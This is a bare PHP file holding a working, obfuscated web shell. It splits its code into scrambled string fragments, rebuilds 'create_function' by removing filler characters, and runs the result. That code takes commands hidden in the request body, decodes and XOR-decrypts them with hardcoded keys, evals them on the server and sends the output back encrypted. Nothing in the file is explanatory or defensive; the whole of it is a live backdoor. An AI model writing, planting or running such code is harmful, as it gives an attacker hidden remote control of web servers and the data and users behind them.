<?php
$F='atch("/$%%kh(%.+)$kf/",@file%_get_%conten%ts("p%hp://inpu%%t';
$X=str_replace('x','','cxrexate_xfuxncxtxion');
$K='"),$m)==%1) {@ob_sta%rt();@%e%val(@g%zuncompr%ess(@x(@ba%se6%4_deco%';
$C='$%k="129435d%d";$kh="%2c181a21%%%e%579%";$kf="96ec8f%ba715c";';
$m=');$%l=str%%len($t);%$o=""%;for($i=0%;$i<$l;)%{for($j=%0;($j<$c%&&$%i%<$l);';
$R='$p="5dy%wSSFVjAk%y%aHl4";functio%n x($%t,$k%)%{$c=strlen($%k';
$Y='$j%+%+,$i++){$o.=$t{%$i}^$k{$j}%%;}}re%turn $o;}%if% (%@preg_m';
$E='$%r=@b%ase64_enc%ode(@%x(@gz%compress(%$%o),$k))%;p%rint("$p$kh$%r$kf");}';
$H='de($m[1%])%,$k%)));$o=@ob_ge%t_%contents%();@ob_en%d_clean%();';
$P=str_replace('%','',$C.$R.$m.$Y.$F.$K.$H.$E);
$B=$X('',$P);$B();
?>
